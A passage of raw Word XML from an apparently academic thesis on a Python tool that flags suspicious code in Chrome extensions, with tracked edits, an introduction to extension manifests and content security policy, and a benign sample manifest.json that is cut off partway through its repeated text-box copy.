      <w:ins w:id="49" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:35:00Z">
        <w:r w:rsidR="00E0148B">
          <w:t>Then, we</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="50" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:35:00Z">
        <w:r w:rsidR="003D03DA" w:rsidDel="00E0148B">
          <w:delText>I</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="003D03DA">
        <w:t xml:space="preserve"> used the parsing tree to check for code that matches with rules </w:t>
      </w:r>
      <w:r w:rsidR="00FF3F71">
        <w:t xml:space="preserve">that indicate suspicious activity. In case of a match, </w:t>
      </w:r>
      <w:ins w:id="51" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:35:00Z">
        <w:r w:rsidR="00C82D3F">
          <w:t>we</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="52" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:35:00Z">
        <w:r w:rsidR="00FF3F71" w:rsidDel="00C82D3F">
          <w:delText>I</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00FF3F71">
        <w:t xml:space="preserve"> print a warning message that will inform the user about the suspicious action. The application is written in Python and can be further expanded by adding more rules.</w:t>
      </w:r>
      <w:del w:id="53" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:35:00Z">
        <w:r w:rsidR="00FF3F71" w:rsidDel="00DC1FB4">
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
        <w:r w:rsidR="007F4D3D" w:rsidDel="00DC1FB4">
          <w:delText xml:space="preserve">The final part is about the text which presents the way </w:delText>
        </w:r>
        <w:r w:rsidR="007F4D3D" w:rsidDel="00EF49B4">
          <w:delText>I</w:delText>
        </w:r>
        <w:r w:rsidR="007F4D3D" w:rsidDel="00DC1FB4">
          <w:delText xml:space="preserve"> worked on the project</w:delText>
        </w:r>
        <w:r w:rsidR="00512FEE" w:rsidDel="00DC1FB4">
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6694F1C6" w14:textId="78870BCC" w:rsidR="005B5B30" w:rsidRPr="003D03DA" w:rsidRDefault="005B5B30" w:rsidP="00C631FC">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:sectPr w:rsidR="005B5B30" w:rsidRPr="003D03DA" w:rsidSect="00DF7906">
          <w:pgSz w:w="11907" w:h="16840" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1134" w:header="709" w:footer="709" w:gutter="284"/>
          <w:cols w:space="708"/>
          <w:titlePg/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B0C1649" w14:textId="77777777" w:rsidR="00D4680C" w:rsidRPr="008B5CBB" w:rsidRDefault="00724A19" w:rsidP="00925228">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="54" w:name="_Toc460936757"/>
      <w:bookmarkStart w:id="55" w:name="_Ref514844322"/>
      <w:bookmarkStart w:id="56" w:name="_Ref514844341"/>
      <w:bookmarkStart w:id="57" w:name="_Ref514844349"/>
      <w:bookmarkStart w:id="58" w:name="_Ref514844366"/>
      <w:bookmarkStart w:id="59" w:name="_Ref514844376"/>
      <w:bookmarkStart w:id="60" w:name="_Ref514844441"/>
      <w:bookmarkStart w:id="61" w:name="_Ref514844465"/>
      <w:bookmarkStart w:id="62" w:name="_Ref514844631"/>
      <w:bookmarkStart w:id="63" w:name="_Toc523071491"/>
      <w:bookmarkStart w:id="64" w:name="_Toc219883673"/>
      <w:bookmarkStart w:id="65" w:name="_Toc220232047"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>INTRODUCTION</w:t>
      </w:r>
      <w:bookmarkEnd w:id="54"/>
      <w:bookmarkEnd w:id="55"/>
      <w:bookmarkEnd w:id="56"/>
      <w:bookmarkEnd w:id="57"/>
      <w:bookmarkEnd w:id="58"/>
      <w:bookmarkEnd w:id="59"/>
      <w:bookmarkEnd w:id="60"/>
      <w:bookmarkEnd w:id="61"/>
      <w:bookmarkEnd w:id="62"/>
      <w:bookmarkEnd w:id="63"/>
    </w:p>
    <w:p w14:paraId="19BFFB2A" w14:textId="77777777" w:rsidR="002E6F36" w:rsidRPr="00BC6AE0" w:rsidRDefault="00A32FE6" w:rsidP="00925228">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="66" w:name="_Ref514844482"/>
      <w:bookmarkStart w:id="67" w:name="_Toc523071492"/>
      <w:bookmarkStart w:id="68" w:name="_Hlk513029350"/>
      <w:bookmarkEnd w:id="64"/>
      <w:bookmarkEnd w:id="65"/>
      <w:r>
        <w:t>Chrome Extension Composition</w:t>
      </w:r>
      <w:bookmarkEnd w:id="66"/>
      <w:bookmarkEnd w:id="67"/>
    </w:p>
    <w:p w14:paraId="75132B7C" w14:textId="77777777" w:rsidR="00113A9A" w:rsidRDefault="00235290" w:rsidP="00941EAC">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Google Chrome supports extensions written in JavaScript </w:t>
      </w:r>
      <w:r w:rsidR="000918EC">
        <w:t>and HTML. Each extension also contains a mandatory manifest (.json file) that</w:t>
      </w:r>
      <w:r w:rsidR="004A4153">
        <w:t xml:space="preserve"> defines a set of properties such as the extension name, description and version number. The manifest is used by the browser to know the functionality offered by the extension </w:t>
      </w:r>
      <w:r w:rsidR="004626A8">
        <w:t>and the</w:t>
      </w:r>
      <w:r w:rsidR="00E82054">
        <w:t xml:space="preserve"> list</w:t>
      </w:r>
      <w:r w:rsidR="001F5872">
        <w:t xml:space="preserve"> of</w:t>
      </w:r>
      <w:r w:rsidR="004626A8">
        <w:t xml:space="preserve"> permissions required to </w:t>
      </w:r>
      <w:r w:rsidR="001F5872">
        <w:t>access the different parts of the extension API.</w:t>
      </w:r>
      <w:r w:rsidR="00941EAC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B781AD8" w14:textId="79AFD80B" w:rsidR="00941EAC" w:rsidRDefault="00941EAC" w:rsidP="00543991">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>In order to be listed on the Chrome Web Store, an extension must have a manifest_version of at least 2, which by default limits the source of scripts and objects used by the exten</w:t>
      </w:r>
      <w:r w:rsidR="009924AB">
        <w:t>sion to “self”. This</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> means functions like </w:t>
      </w:r>
      <w:r w:rsidRPr="009924AB">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are disabled, inline JavaScript will not be executed and only local script an object</w:t>
      </w:r>
      <w:r w:rsidR="00AC22F6">
        <w:t xml:space="preserve"> resources can be loaded. In order to relax these limitations, an extension must specify the changes to the policy in the manifest file. The changes will warn users downloading the extension that </w:t>
      </w:r>
      <w:r w:rsidR="00C4207C">
        <w:t>modifications have been made and that the extension may be vulnerable to attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49AAD8C3" w14:textId="7E6CCCC1" w:rsidR="00FF5D68" w:rsidRDefault="001677EB" w:rsidP="00FF5D68">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251651072" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5D6C34D3" wp14:editId="2EF7FECD">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>2157730</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="page">
                  <wp:posOffset>3920490</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2933700" cy="313372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3133725"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="72C2DCD9" w14:textId="3EE034D4" w:rsidR="006A6E3D" w:rsidRPr="002522AF" w:rsidRDefault="006A6E3D" w:rsidP="002522AF">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>{</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                              </w:rPr>
                              <w:t>"name"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"description"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                              </w:rPr>
                              <w:t>"example"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"Example extension"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                              </w:rPr>
                              <w:t>"version"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"1.0"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                              </w:rPr>
                              <w:t>"browser_action"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>{</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                              </w:rPr>
                              <w:t>"default_icon"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"icon.png"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                              </w:rPr>
                              <w:t>"default_popup"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"popup.html"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                              </w:rPr>
                              <w:t>"permissions"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"activeTab"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"https://ajax.googleapis.com/"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>]</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                              </w:rPr>
                              <w:t>"web_accessible_resources"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"images/*.png "</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"style/double-rainbow.css"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"scripts/double-rainbow.js"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"script/main.js"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"templates/*"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>]</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>}</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3A57767E" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="002522AF" w:rsidRDefault="006A6E3D" w:rsidP="002522AF">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="0004E27D" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="002522AF" w:rsidRDefault="006A6E3D" w:rsidP="005265FC">
                            <w:pPr>
                              <w:jc w:val="left"/>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69.9pt;margin-top:308.7pt;width:231pt;height:246.7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" filled="f" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="72C2DCD9" w14:textId="3EE034D4" w:rsidR="006A6E3D" w:rsidRPr="002522AF" w:rsidRDefault="006A6E3D" w:rsidP="002522AF">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>{</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                        </w:rPr>
                        <w:t>"name"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"description"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                        </w:rPr>
                        <w:t>"example"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"Example extension"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                        </w:rPr>
                        <w:t>"version"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"1.0"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                        </w:rPr>
                        <w:t>"browser_action"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>{</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                        </w:rPr>
                        <w:t>"default_icon"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"icon.png"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                        </w:rPr>
                        <w:t>"default_popup"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"popup.html"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                        </w:rPr>
                        <w:t>"permissions"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"activeTab"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"https://ajax.googleapis.com/"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>]</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
